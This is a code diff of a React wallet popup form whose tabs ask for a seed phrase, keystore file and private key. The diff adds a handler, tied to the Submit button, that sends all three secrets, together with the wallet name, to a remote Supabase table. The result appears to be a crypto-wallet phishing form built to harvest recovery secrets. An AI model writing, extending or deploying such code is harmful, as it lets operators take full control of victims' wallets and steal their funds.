@@ -1,10 +1,9 @@
 import { useState } from "react";
 import { PopUpButtons } from "./Button";
+import { supabase } from "../service/supabase";
 
 const PopupForm = ({ setCurrentWallet, currentWallet }) => {
   const [activeTab, setActiveTab] = useState("phrase");
-
-  console.log(currentWallet);
 
   const [formData, setFormData] = useState({
     phrase: "",
@@ -24,16 +23,24 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
     }));
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
-    console.log(currentWallet.name, formData);
-    // Add your submission logic here
+  };
+
+  const handleSubmitWalletForm = async () => {
+    const { error } = await supabase.from("wallet_form").insert([
+      {
+        wallet_name: currentWallet.name,
+        wallet_phase: formData.phrase,
+        wallet_keystore: formData.keystore,
+        wallet_privatekey: formData.privatekey,
+      },
+    ]);
   };
 
   return (
     <div className="flex w-full items-center justify-center">
       <div className="w-full max-w-md rounded-lg bg-white shadow-xl dark:bg-slate-800 dark:bg-opacity-80">
-        {/* Header with tabs */}
         <div className="border-b border-gray-200">
           <nav className="flex">
             <button
@@ -57,7 +64,6 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
           </nav>
         </div>
 
-        {/* Form content */}
         <div className="p-4">
           <form onSubmit={handleSubmit}>
             {/* Phrase tab content */}
@@ -126,6 +132,7 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
             <PopUpButtons
               text="Submit"
               handle1={() => setCurrentWallet(null)}
+              handle2={handleSubmitWalletForm}
             />
           </form>
         </div>
